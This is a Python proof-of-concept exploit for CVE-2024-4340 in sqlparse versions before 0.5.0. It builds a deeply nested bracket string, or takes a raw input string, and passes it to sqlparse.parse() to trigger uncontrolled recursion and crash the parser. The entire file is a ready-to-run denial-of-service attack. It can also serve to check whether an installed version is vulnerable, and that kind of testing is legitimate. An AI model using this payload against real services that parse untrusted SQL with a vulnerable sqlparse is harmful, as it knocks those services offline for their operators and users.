#!/usr/bin/env python3
"""
PoC – CVE-2024-4340 (sqlparse &lt; 0.5.0)
Triggers uncontrolled recursion DoS in sqlparse.parse().

INPUT FORMAT
    python3 exploit.py <payload>

    <payload> can be:
        • An integer N  – the script will generate '['*N + ']'*N
        • A raw string – the script will feed it verbatim to sqlparse.parse()

EXAMPLE THAT CRASHES v0.4.4
    python3 exploit.py 10000
"""
import sys
import sqlparse

def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <payload_or_depth>")
        sys.exit(1)

    arg = sys.argv[1]
    # If arg is an int, create a bracket bomb; otherwise use raw string.
    try:
        depth = int(arg)
        payload = "[" * depth + "]" * depth
    except ValueError:
        payload = arg

    # This call will raise RecursionError on vulnerable versions (<0.5.0)
    sqlparse.parse(payload)

if __name__ == "__main__":
    main()